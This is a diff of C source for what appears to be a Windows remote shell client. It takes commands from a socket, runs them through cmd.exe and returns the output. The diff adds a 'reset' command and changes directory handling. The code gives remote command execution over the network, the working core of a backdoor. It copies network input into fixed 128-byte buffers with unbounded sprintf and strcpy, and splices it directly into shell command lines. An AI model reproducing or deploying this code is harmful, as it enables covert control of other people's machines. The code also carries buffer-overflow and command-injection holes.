@@ -26,7 +26,6 @@ int comm(SOCKET sock, int BUF_SIZE, int REPLY_MAX_SIZE){
     char * cwd;
     cwd = getCmdOut("echo %HOMEDRIVE%%HOMEPATH%", 128);
     cwd[strcspn(cwd, "\n")] = '\0';
-    // NOTE: this code lead to breaking stuff if the program is run in a drive different then the home drive!!!!
 
     while (TRUE){
         memset(buf, 0, sizeof(buf));
@@ -65,14 +64,34 @@ Places the necessary response in char *reply, and returns a pointer to the reply
 char* processMsg(char * msg, char * cwd, int REPLY_MAX_SIZE){
     // check if a shell (cmd prompt) command is being issued
     // an input that starts with "cmd" or "c"
-    if (strcmp(strtok(msg, " "), "cmd") == 0 || strcmp(strtok(msg, " "), "c") == 0){
+    char msgcpy[128];
+    strncpy(msgcpy, msg, sizeof(msgcpy));
+    if (strcmp(strtok(msgcpy, " "), "cmd") == 0 || strcmp(strtok(msgcpy, " "), "c") == 0){
         msg+=(strcspn(msg, " ")+1); // pass everthing after the "cmd " or "c " at the beginning of the msg
         return processShellCmd(msg, cwd, REPLY_MAX_SIZE);
     }
     else {  // it is a command not meant to be executed by the shell
-        // LATER: THIS MIGHT NOT WORK BECAUSE STRTOK MANGLES THE STRING THAT YOU PUT INTO IT
-        char * reply = (char*)calloc(REPLY_MAX_SIZE, sizeof(char));
-        strcpy(reply, "That is not a shell command and is currently not supported\n");
+        return processExtCmd(msg, cwd, REPLY_MAX_SIZE);
+    }
+}
+
+/*
+Process external commands. Perform function and return output
+*/
+char* processExtCmd(char * cmd, char * cwd, int REPLY_MAX_SIZE){
+    char * reply = (char*)calloc(REPLY_MAX_SIZE, sizeof(char));
+    if (strcmp(cmd, "reset") == 0){
+        char * temp;
+        temp = getCmdOut("echo %HOMEDRIVE%%HOMEPATH%", 128);
+        temp[strcspn(temp, "\n")] = '\0';
+        strcpy(cwd, temp);
+        free(temp);
+
+        strcpy(reply, cwd);
+        return reply;
+    }
+    else{
+        strcpy(reply, "That command is not recognized!\n");
         return reply;
     }
 }
@@ -101,7 +120,10 @@ char* processShellCmd(char * cmd, char * cwd, int REPLY_MAX_SIZE) {
         }
         else { // then it is a relative path
             char temp[128];
-            sprintf(temp, "%s\\%s", cwd, arg);
+            char * dirptr = cmd;
+            dirptr += (strcspn(cmd, " ")+1);
+            
+            sprintf(temp, "%s\\%s", cwd, dirptr);
             strcpy(cwd, temp);
         }
         return strcat(strdup(cwd), "\n");
@@ -115,7 +137,7 @@ char* processShellCmd(char * cmd, char * cwd, int REPLY_MAX_SIZE) {
         char cwdDrive[8] = "";
 
         strncpy(cwdDrive, cwd, 2);
-        sprintf(finalCmd, "%s && cd %s\\ && %s 2>&1", cwdDrive, cwd, cmd);
+        sprintf(finalCmd, "%s 2>&1 && cd %s\\ 2>&1 && %s 2>&1", cwdDrive, cwd, cmd);
 
         // printf("FINAL COMMAND: %s\n", finalCmd);
         return getCmdOut(finalCmd, REPLY_MAX_SIZE);
